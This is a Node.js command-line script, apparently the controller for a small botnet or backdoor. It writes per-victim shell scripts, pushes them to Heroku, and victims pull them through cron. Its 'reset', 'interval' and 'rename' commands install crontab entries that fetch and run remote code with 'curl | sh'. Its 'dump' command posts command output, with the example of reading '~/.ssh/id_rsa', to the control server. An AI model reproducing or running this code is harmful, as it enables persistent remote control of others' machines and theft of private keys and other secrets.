#! /usr/bin/env node
'use strict'

const shell = require('shelljs')

const i = process.argv.indexOf('/usr/local/bin/hack')
const env = process.argv[i+1]
const cmd = process.argv[i+2]
const args = process.argv.slice(i+3)

const npm = require('../package.json')
const url = npm.config.key


hack(env, cmd, args)


function hack(env, cmd, args) {

  if (env === 'help') {
    help()

  } else if (env === 'deploy') {
    shell.cd(__dirname + '/../scripts/env')
    shell.exec([
      'git add -A',
      'git commit -m "sinister chet"',
      'git push heroku master',
    ].join('; '))

  } else if (cmd === 'exec') {
    // `hack live exec "say hello world"`
    write(env, args[0])

  } else if (cmd === 'dump') {
    // `hack live dump "cat ~/.ssh/id_rsa"`
    write(env, "echo " + JSON.stringify("$(" + args[0] + ")") + " | curl --data-binary @- " + url + "/dump")

  } else if (cmd == 'reset') {
    // `hack live reset`
     write(env, [
      'crontab -r',
      'echo "* * * * * curl -s ' + url + '/env/' + env + ' | sh" | crontab',
    ].join('\n'))

  } else if (cmd === 'interval') {
    // `hack live interval 1d`
    var freq

    if (args[0] === '1m') {
      freq = "* * * * *"
    } else if (args[0] === '1h') {
      freq = "0 * * * *"
    } else if (args[0] === '1d') {
      freq = "0 0 * * *"
    } else if (args[0] === '1M') {
      freq = "0 0 0 * *"
    } else if (args[0] === '1y') {
      freq = "0 0 0 0 *"
    } else if (args[0] === '1w') {
      freq = "0 0 * * 0"
    } else {
      throw new Error('Unknown interval', args[0])
    }

    write(env, [
      'crontab -r',
      'echo "' + freq + ' curl -s ' + url + '/env/' + env + '| sh" | crontab',
    ].join('\n'))

  } else if (cmd === 'cron') {
    // `hack live cron "20 16 * * * say 'its 4 20!'"`
    write(env, "echo " + JSON.stringify(args[0]) + " | crontab")

  } else if (cmd === 'forget') {
    // `hack live forget`
    write(env, "crontab -r")

  } else if (cmd === 'rename') {
    // `hack live rename jon`
    const newEnv = args[0]

    write(env, [
      "crontab -r",
      'echo "* * * * * curl -s ' + url + '/env/' + newEnv + ' | sh" | crontab',
    ].join('\n'))

    write(newEnv, '')

  } else {
    help()
  }
}

function write(env, cmd) {
  const id = Math.round(Math.random()*10000000000).toString()

  const text = [
    "#!/usr/bin/env bash",
    "",
    "if [[ ! -e /tmp/hack." + id + " ]]; then",
    cmd,
    "rm -f /tmp/hack/*",
    "touch /tmp/hack." + id,
    "fi",
  ].join('\n')

  // cd to this repo!
  shell.cd(__dirname + '/../scripts/env')
  // make sure the environment file exists!
  if (!shell.test('-e', env)) {
    shell.touch(env)
  }
  // write to the environment file
  shell.exec('echo ' + JSON.stringify(text) + ' > ' + env)
}


function help() {
  console.log('hack v' + npm.version)
  console.log('usage: hack <env> <cmd> [args]')
}